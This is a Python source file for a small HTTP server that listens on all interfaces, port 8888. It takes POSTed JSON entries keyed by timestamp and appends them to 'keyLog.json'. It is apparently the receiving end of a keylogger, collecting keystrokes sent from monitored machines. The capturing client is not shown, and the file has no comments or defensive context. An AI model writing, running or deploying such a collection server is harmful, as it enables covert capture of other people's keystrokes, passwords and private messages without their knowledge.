from http.server import HTTPServer, BaseHTTPRequestHandler
import json

firstMessage=True

class handler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()

    def _create_message(self, message):
        response={
                "response": "received message successfully",
                "message": message
                }
        res=json.dumps(response)
        #res=f"<html><body><h1>{message}</h1></body></html>"
        return res.encode("utf8")

    def do_GET(self):
        print("got a GET request")
        self._set_headers()
        self.wfile.write(self._create_message("GET request"))

    def do_POST(self):
        content_length=int(self.headers['Content-Length'])
        post_data=self.rfile.read(content_length)
        data=json.loads(post_data)
        
        global firstMessage

        timestamp=next(iter(data))
        if firstMessage:
            log={
                    "keys":[
                        {timestamp: data[timestamp]}
                        ]
                    }
            with open("keyLog.json",'w') as f:
                json.dump(log, f, indent=4)

            firstMessage=False
        
        else:
            with open('keyLog.json', 'r+') as f:
                old_log=json.load(f)
                new_item={
                        timestamp: data[timestamp]
                        }
                old_log["keys"].append(new_item)
                f.seek(0)
                json.dump(old_log, f, indent=4)
                f.truncate()

        json_string=json.dumps(data, indent=2)
        print(json_string)
        self._set_headers()
        self.wfile.write(self._create_message("POST request"))


def run(server_class=HTTPServer, handler_class=handler, addr="localhost", port=8000):
    log_dir=r"./"
    f=open((log_dir+"keyLog.json"), "w+")

    server_address=(addr, port)
    httpd=server_class(server_address, handler_class)
    print("starting httpd server")
    httpd.serve_forever()

if __name__=="__main__":
    run(addr="0.0.0.0", port=8888)

